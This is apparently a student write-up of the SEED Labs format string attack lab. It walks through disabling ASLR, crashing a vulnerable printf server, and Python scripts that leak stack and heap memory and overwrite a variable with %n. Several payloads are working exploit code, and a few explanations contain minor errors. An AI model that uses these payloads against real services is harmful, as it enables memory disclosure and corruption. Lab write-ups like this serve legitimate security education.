# Week 6: SEED Labs – Format String Attack Lab

## Environment Setup

### Turning off Countermeasure

Modern operating systems implement countermeasures to mitigate exploits like the format-string. Space randomization is used to randomize the starting address of heap and stack, this makes guessing the exact address difficult as adress guessing is one of the critical steps of this exploit.
In order to complete this lab we need to disable memory randommization, we can do this by using the following command: 
```
sudo sysctl -w kernel.randomize_va_space=0
```
### The Vulnerable Program
The vulnerable program is the file *format.c* and the way how the input data is fed into the *printf()* functions is unsafe leading to a format-string vulnerability. The segment of code containing the vulnerability is the following: 
```
void myprintf(char *msg)
{
// This line has a format-string vulnerability
printf(msg);
}
```
### Task 1: Crashing the Program
The goal of task 1 is to crash the program by providing an input to the server.

To crash the program we provided to following input: 
```
%s%s%s%s%s%s%s%s%s%s%s%s%s%s
```
This crashes the program because the *printf()* function is not capable of receiving this much format specifiers. These values are not valid addresses which will cause a segmentation fault.

### Task 2: Printing Out the Server Program’s Memory


#### Task2.A: Stack Data
In this task we need to figure out the number of *%x* we need to introduce to the input so we can get the server to print out the first four bytes of our input. In other words we need to find the number of hops, N, in the memory needed, to align the *printf()* internal pointer to the char* msg location in memory.

We took a hit and miss approach to accomplish this task. We injected an increasing numbers of the *%x* specifier until we got to the content of our input.

In our case it took a total of 64 *%x*, meaning that the first character of the msg was 64*4 = 256 bytes after the last argument of the *print()* function.

We ended up with the following *build_string.py* file:
```
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number = 0xABCDABCD

content[0:4] = (number).to_bytes(4,byteorder='little')

s = "%.8x\n"*64

fmt= (s).encode('latin-1')

content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

#### Task2.B: Heap Data
The task is a extension of the previous task, meaning the we need the previous calculations to achieve the goal of printing the secret message. In task2A we found the correct place in memory using *%x*, by jumping through the memory, to print out data on the stack.
In this task we need to introduce an extra *%s* format specifier to print the secret message, meaning that we need to remove a *%x* specifier. Ending up with 63 *%x* followed by 1 *%s*. The *%s* specifier will print the wanted string.   

We ended up with the following *build_string.py* file:
```
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number = 0x080b4008

content[0:4] = (number).to_bytes(4,byteorder='little')

s = "%.8x\n"*63 + "%s"

fmt= (s).encode('latin-1')

content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
And the secret message is: "A secret message".

### Task 3: Modifying the Server Program’s Memory
#### Task 3.A: Change the value to a different value
The *%n* format specifier assigns a variable the count of the number of characters used in the print statement before the occurence of the *%n*. With this in mind it is possible to overwrite values in memory.

In this task we need to change the value of the *target* variable. To accomplish this we need to skip over the 63 addresses with the ``` %.8*63 ``` format and happend a *%n* at the end of the built string, overwrting the value *target* value.  

The *target* variable ended up with the value *1fc* that is equal to 508, which represents the 63 addresses plus 4 bytes corresponding to the *number* variable with value *0x080e5068*.

We ended up with the following *build_string.py* file:
```
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number = 0x080e5068

content[0:4] = (number).to_bytes(4,byteorder='little')

s = "%.8x"*63 + "%n"

fmt= (s).encode('latin-1')

content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
#### Task3.B: Change the value to 0x5000 
 This task is a extension of the previous task, meaning that taskt3.A is a starting point to complete this subtask.

Kepp this operation in mind:
```
    19972 -> 0x5000 - 0x1fc
```

 To modify the *target* variable to the value *0x500*, we need to skip the 63 addresses and inject the value 19972 resultant of the above subtraction. <br>

We found a little obstacle when finishing this task, every time we executed the file a segmentation fault occured.  
We the realized that the % formatters made the memory hop one address, leading to the *printf()* pointer to point to the wrong address. To resolve this issue we removed a *%x* specifier, having now a total of 62, making the injection of the characters increase by 8. So we had to add 8 extra hexadecimal characters, ending up with 19980.

We ended up with the following *build_string.py* file:
```
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number = 0x080e5068

content[0:4] = (number).to_bytes(4,byteorder='little')


s = "%.8x"*62 + "%.19980d%n"

fmt= (s).encode('latin-1')

content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
